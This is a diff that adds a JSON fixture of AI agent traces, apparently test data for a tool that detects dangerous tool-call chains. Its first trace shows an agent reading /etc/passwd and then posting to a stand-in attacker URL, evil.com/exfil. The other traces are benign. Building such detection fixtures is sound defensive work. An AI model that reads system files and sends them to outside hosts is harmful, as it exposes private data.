@@ -1,0 +1,112 @@
+[
+  {
+    "id": "trace-001",
+    "sessionId": "session-alpha",
+    "name": "dangerous-chain-trace",
+    "startTime": "2023-11-14T22:13:20Z",
+    "endTime": "2023-11-14T22:13:23Z",
+    "metadata": {"agent": "agent-alpha"},
+    "observations": [
+      {
+        "id": "obs-001a",
+        "type": "SPAN",
+        "name": "read_file",
+        "startTime": "2023-11-14T22:13:20Z",
+        "endTime": "2023-11-14T22:13:21Z",
+        "input": {"path": "/etc/passwd"},
+        "output": "root:x:0:0:root:/root:/bin/bash"
+      },
+      {
+        "id": "obs-001b",
+        "type": "GENERATION",
+        "name": "llm-call",
+        "startTime": "2023-11-14T22:13:21Z",
+        "endTime": "2023-11-14T22:13:22Z",
+        "model": "gpt-4"
+      },
+      {
+        "id": "obs-001c",
+        "type": "SPAN",
+        "name": "http_request",
+        "startTime": "2023-11-14T22:13:22Z",
+        "endTime": "2023-11-14T22:13:23Z",
+        "input": {"url": "https://evil.com/exfil"},
+        "output": "200 OK"
+      }
+    ]
+  },
+  {
+    "id": "trace-002",
+    "sessionId": "session-beta",
+    "name": "clean-trace",
+    "startTime": "2023-11-14T22:13:30Z",
+    "endTime": "2023-11-14T22:13:33Z",
+    "metadata": {"agent": "agent-beta"},
+    "observations": [
+      {
+        "id": "obs-002a",
+        "type": "SPAN",
+        "name": "search",
+        "startTime": "2023-11-14T22:13:30Z",
+        "endTime": "2023-11-14T22:13:31Z",
+        "input": {"query": "hello"}
+      },
+      {
+        "id": "obs-002b",
+        "type": "SPAN",
+        "name": "display",
+        "startTime": "2023-11-14T22:13:32Z",
+        "endTime": "2023-11-14T22:13:33Z",
+        "input": {"text": "results"}
+      }
+    ]
+  },
+  {
+    "id": "trace-003a",
+    "sessionId": "session-gamma",
+    "name": "multi-agent-trace-a",
+    "startTime": "2023-11-14T22:13:40Z",
+    "endTime": "2023-11-14T22:13:43Z",
+    "metadata": {"agent": "agent-gamma"},
+    "observations": [
+      {
+        "id": "obs-003a1",
+        "type": "SPAN",
+        "name": "read_file",
+        "startTime": "2023-11-14T22:13:40Z",
+        "endTime": "2023-11-14T22:13:41Z"
+      },
+      {
+        "id": "obs-003a2",
+        "type": "SPAN",
+        "name": "summarize",
+        "startTime": "2023-11-14T22:13:42Z",
+        "endTime": "2023-11-14T22:13:43Z"
+      }
+    ]
+  },
+  {
+    "id": "trace-003b",
+    "sessionId": "session-gamma",
+    "name": "multi-agent-trace-b",
+    "startTime": "2023-11-14T22:13:44Z",
+    "endTime": "2023-11-14T22:13:47Z",
+    "metadata": {"agent": "agent-gamma"},
+    "observations": [
+      {
+        "id": "obs-003b1",
+        "type": "SPAN",
+        "name": "http_request",
+        "startTime": "2023-11-14T22:13:44Z",
+        "endTime": "2023-11-14T22:13:45Z"
+      },
+      {
+        "id": "obs-003b2",
+        "type": "SPAN",
+        "name": "write_file",
+        "startTime": "2023-11-14T22:13:46Z",
+        "endTime": "2023-11-14T22:13:47Z"
+      }
+    ]
+  }
+]
